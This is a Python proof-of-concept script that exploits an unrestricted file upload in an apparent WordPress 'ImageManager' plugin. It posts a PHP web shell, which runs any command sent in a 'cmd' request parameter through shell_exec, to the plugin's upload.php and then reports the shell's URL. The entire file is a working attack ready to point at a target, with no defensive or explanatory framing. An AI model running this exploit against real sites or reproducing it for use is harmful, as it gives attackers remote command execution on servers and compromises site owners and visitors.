import requests

# Configuration
wordpress_url = "http://target-wordpress-site.com"  # Replace with the target WordPress site
upload_endpoint = f"{wordpress_url}/wp-content/plugins/imagemanager/upload.php"  # Adjust based on ImageManager's upload path
payload_filename = "shell.php"

# PHP payload for the shell
php_payload = """<?php
if (isset($_REQUEST['cmd'])) {
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
}
?>"""

# File to upload
files = {
    'file': (payload_filename, php_payload, 'application/x-php')
}

# Upload the malicious file
def upload_shell():
    print("[*] Attempting to upload the shell...")
    try:
        response = requests.post(upload_endpoint, files=files)
        if response.status_code == 200:
            print("[+] Shell uploaded successfully!")
            print(f"[!] Check if the shell is accessible at: {wordpress_url}/wp-content/uploads/{payload_filename}")
        else:
            print("[-] Upload failed.")
            print(f"Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during upload: {e}")

if __name__ == "__main__":
    print("[*] Starting ImageManager Shell Upload PoC")
    upload_shell()
